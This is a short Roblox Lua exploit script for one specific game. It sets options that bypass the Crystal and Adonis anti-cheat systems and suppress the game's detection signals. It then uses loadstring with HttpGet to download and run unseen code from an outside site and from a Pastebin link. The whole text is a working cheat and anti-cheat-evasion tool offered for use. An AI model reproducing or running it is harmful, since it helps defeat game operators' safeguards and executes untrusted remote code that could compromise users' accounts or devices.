if game.PlaceId == 3522803956 then
getgenv().BypassSettings = {
  ["Crystal AntiCheat"] = true,
  ["Adonis"] = true,

  ["Anti-Obfuscated Scripts"] = true,-- CANNOT BE ENABLED WITH CRYSTAL This will block any obfuscated script on the client from running (Not executed by your exploit thought)
  ["Random"] = true, -- Will disallow scripts calling, GetPropertyChanged signal on WalkSpeed, JumpPower, Gravity, Health, LogService

  ["Enable Kill Logs"] = true, -- Say if you want to get told what's bypassed
}

loadstring(game:HttpGet("https://irisapp.ca/TheGoodSucc/iAntiCheat.lua"))()

wait(5)
loadstring(game:HttpGet('https://pastebin.com/raw/RJ3QSqEZ'))()
end